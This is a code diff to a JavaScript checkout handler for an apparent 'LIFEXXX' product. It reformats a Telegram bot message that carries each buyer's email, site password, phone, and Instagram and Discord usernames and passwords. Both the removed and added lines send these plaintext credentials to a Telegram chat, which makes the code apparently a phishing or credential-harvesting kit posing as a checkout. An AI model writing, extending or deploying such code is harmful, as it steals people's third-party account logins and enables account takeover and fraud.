@@ -55,21 +55,22 @@ module.exports = async (request, response) => {
     return;
   }
 
-  let telegramText = `New LIFEXXX checkout\\nPlan: ${product}\\nAmount: $${price} USD\\nAccount name: ${accountName}\\nEmail: ${email}`;
-  if (password) {
-    telegramText += `\\nPassword: ${password}`;
-  }
-  if (confirmPassword) {
-    telegramText += `\\nConfirm Password: ${confirmPassword}`;
-  }
-  if (phone) {
-    telegramText += `\\nPhone: ${phone}`;
-  }
+  const telegramData = {
+    plan: product,
+    amount: `$${price} USD`,
+    accountName: accountName,
+    email: email
+  };
+  if (password) telegramData.password = password;
+  if (confirmPassword) telegramData.confirmPassword = confirmPassword;
+  if (phone) telegramData.phone = phone;
   if (instagramUsername && instagramPassword) {
-    telegramText += `\\nInstagram: ${instagramUsername}\\nInstagram Password: ${instagramPassword}`;
+    telegramData.instagram = instagramUsername;
+    telegramData.instagramPassword = instagramPassword;
   }
   if (discordUsername && discordPassword) {
-    telegramText += `\\nDiscord: ${discordUsername}\\nDiscord Password: ${discordPassword}`;
+    telegramData.discord = discordUsername;
+    telegramData.discordPassword = discordPassword;
   }
 
   const telegram = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -77,7 +78,7 @@ module.exports = async (request, response) => {
     headers: { 'content-type': 'application/json' },
     body: JSON.stringify({
       chat_id: chatId,
-      text: telegramText
+      text: JSON.stringify(telegramData, null, 2)
     })
   });
 
